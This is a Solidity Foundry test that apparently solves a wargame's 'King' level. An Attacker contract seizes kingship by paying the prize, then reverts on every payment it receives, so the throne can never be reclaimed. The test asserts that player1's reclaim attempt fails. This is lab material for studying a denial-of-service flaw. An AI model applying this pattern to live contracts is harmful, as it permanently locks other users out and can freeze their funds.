// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import {King} from "../src/King.sol";

contract Attacker {
    function attack(address payable _king) public payable {
        King king = King(_king);
        uint256 _value = king.prize();
        (bool success,) = _king.call{value: _value}("");
        require(success, "attack failed");
    }

    receive() external payable {
        revert("sorry buddy, I got you!");
    }
}

contract KingTest is Test {
    Attacker attacker;
    King _king;

    address player1 = address(0x123);
    address player2 = address(0x456);

    function setUp() public {
        vm.deal(player1, 100 ether);
        vm.deal(player2, 100 ether);

        vm.startPrank(player1);
        attacker = new Attacker();
        _king = new King{value: 0.1 ether}();
        vm.stopPrank();
    }

    function test_king() public {
        assertEq(_king.owner(), player1);

        console.log("Initial King:", _king._king());

        // player2 performs the attack
        vm.startPrank(player2);
        attacker.attack{value: 1 ether}(payable(address(_king)));
        vm.stopPrank();

        console.log("New King:", _king._king());
        console.log("Prize:", _king.prize());

        // player1 tries to reclaim kingship -> should fail
        vm.startPrank(player1);
        vm.expectRevert(bytes("sorry buddy, I got you!"));
        (bool success,) = address(_king).call{value: 2 ether}("");
        vm.stopPrank();
    }
}
